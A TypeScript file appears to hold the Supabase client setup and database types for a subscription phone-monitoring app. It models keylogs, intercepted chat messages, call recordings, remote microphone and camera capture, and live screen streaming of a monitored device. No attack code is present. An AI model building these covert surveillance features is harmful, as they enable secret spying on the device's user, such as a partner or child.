import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  throw new Error('Missing Supabase environment variables');
}

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

export type Profile = {
  id: string;
  email: string;
  full_name: string | null;
  avatar_url: string | null;
  role: 'user' | 'admin';
  subscription_status: 'none' | 'active' | 'expired' | 'cancelled';
  subscription_plan: 'basic' | 'premium' | 'family' | null;
  subscription_end_date: string | null;
  created_at: string;
  updated_at: string;
};

export type Device = {
  id: string;
  user_id: string;
  device_name: string;
  device_type: 'android' | 'ios';
  device_id: string;
  last_sync: string | null;
  is_active: boolean;
  battery_level: number | null;
  is_online: boolean;
  created_at: string;
};

export type Location = {
  id: string;
  device_id: string;
  latitude: number;
  longitude: number;
  accuracy: number | null;
  address: string | null;
  timestamp: string;
  created_at: string;
};

export type Geofence = {
  id: string;
  user_id: string;
  device_id: string;
  name: string;
  latitude: number;
  longitude: number;
  radius: number;
  is_active: boolean;
  notify_on_enter: boolean;
  notify_on_exit: boolean;
  created_at: string;
};

export type Message = {
  id: string;
  device_id: string;
  contact_name: string | null;
  phone_number: string;
  message_text: string;
  message_type: 'incoming' | 'outgoing';
  platform: 'sms' | 'whatsapp' | 'telegram' | 'messenger';
  timestamp: string;
  created_at: string;
};

export type CallLog = {
  id: string;
  device_id: string;
  contact_name: string | null;
  phone_number: string;
  duration: number;
  call_type: 'incoming' | 'outgoing' | 'missed';
  timestamp: string;
  created_at: string;
};

export type AppUsage = {
  id: string;
  device_id: string;
  app_name: string;
  package_name: string;
  usage_duration: number;
  is_blocked: boolean;
  timestamp: string;
  created_at: string;
};

export type Keylog = {
  id: string;
  device_id: string;
  text_input: string;
  app_name: string | null;
  timestamp: string;
  created_at: string;
};

export type BrowserHistory = {
  id: string;
  device_id: string;
  url: string;
  title: string | null;
  visit_count: number;
  is_blocked: boolean;
  timestamp: string;
  created_at: string;
};

export type MediaFile = {
  id: string;
  device_id: string;
  file_name: string;
  file_type: 'image' | 'video';
  file_url: string;
  thumbnail_url: string | null;
  file_size: number | null;
  timestamp: string;
  created_at: string;
};

export type Subscription = {
  id: string;
  user_id: string;
  plan_type: 'basic' | 'premium' | 'family';
  price: number;
  start_date: string;
  end_date: string;
  stripe_payment_id: string | null;
  stripe_subscription_id: string | null;
  status: 'active' | 'cancelled' | 'expired';
  created_at: string;
};

export type SupportTicket = {
  id: string;
  user_id: string;
  subject: string;
  message: string;
  status: 'open' | 'in_progress' | 'resolved' | 'closed';
  priority: 'low' | 'normal' | 'high' | 'urgent';
  created_at: string;
  updated_at: string;
};

export type BlockedItem = {
  id: string;
  device_id: string;
  item_type: 'website' | 'app';
  item_value: string;
  reason: string | null;
  created_at: string;
};

export type SystemLog = {
  id: string;
  user_id: string | null;
  action: string;
  details: Record<string, unknown> | null;
  ip_address: string | null;
  user_agent: string | null;
  created_at: string;
};

export type GeofenceAlert = {
  id: string;
  geofence_id: string;
  device_id: string;
  event_type: 'entered' | 'exited';
  timestamp: string;
  is_read: boolean;
  created_at: string;
};

export type AmbientRecording = {
  id: string;
  device_id: string;
  duration_seconds: number;
  file_url: string;
  file_size: number | null;
  status: 'pending' | 'recording' | 'completed' | 'failed';
  triggered_by: 'remote' | 'scheduled';
  timestamp: string;
  created_at: string;
};

export type RemoteCapture = {
  id: string;
  device_id: string;
  capture_type: 'photo' | 'video';
  camera: 'front' | 'back';
  file_url: string;
  thumbnail_url: string | null;
  file_size: number | null;
  duration_seconds: number | null;
  status: 'pending' | 'capturing' | 'completed' | 'failed';
  timestamp: string;
  created_at: string;
};

export type CallRecording = {
  id: string;
  device_id: string;
  phone_number: string;
  contact_name: string | null;
  call_type: 'incoming' | 'outgoing';
  duration: number;
  file_url: string;
  file_size: number | null;
  status: 'pending' | 'recording' | 'completed' | 'failed';
  timestamp: string;
  created_at: string;
};

export type Screenshot = {
  id: string;
  device_id: string;
  file_url: string;
  thumbnail_url: string | null;
  file_size: number | null;
  status: 'pending' | 'capturing' | 'completed' | 'failed';
  timestamp: string;
  created_at: string;
};

export type ScreenStreamSession = {
  id: string;
  device_id: string;
  webrtc_offer: string | null;
  webrtc_answer: string | null;
  ice_candidates: string | null;
  status: 'pending' | 'connecting' | 'streaming' | 'ended' | 'failed';
  started_at: string | null;
  ended_at: string | null;
  created_at: string;
};

export type RealTimeAlert = {
  id: string;
  user_id: string;
  device_id: string;
  alert_type: 'geofence_enter' | 'geofence_exit' | 'keyword' | 'suspicious_app' | 'blocked_access' | 'low_battery' | 'device_offline';
  severity: 'low' | 'normal' | 'high' | 'critical';
  title: string;
  message: string;
  metadata: Record<string, unknown> | null;
  is_read: boolean;
  is_resolved: boolean;
  resolved_at: string | null;
  resolved_by: string | null;
  created_at: string;
};

export type KeywordAlert = {
  id: string;
  user_id: string;
  keyword: string;
  is_case_sensitive: boolean;
  alert_severity: 'low' | 'normal' | 'high' | 'critical';
  is_active: boolean;
  created_at: string;
};

export type Admin2FACode = {
  id: string;
  user_id: string;
  code_hash: string;
  is_used: boolean;
  used_at: string | null;
  created_at: string;
  expires_at: string;
};

export type UserNotificationSettings = {
  id: string;
  user_id: string;
  geofence_alerts: boolean;
  message_alerts: boolean;
  call_alerts: boolean;
  app_block_alerts: boolean;
  keyword_alerts: boolean;
  weekly_reports: boolean;
  low_battery_alerts: boolean;
  device_offline_alerts: boolean;
  email_notifications: boolean;
  push_notifications: boolean;
  created_at: string;
  updated_at: string;
};
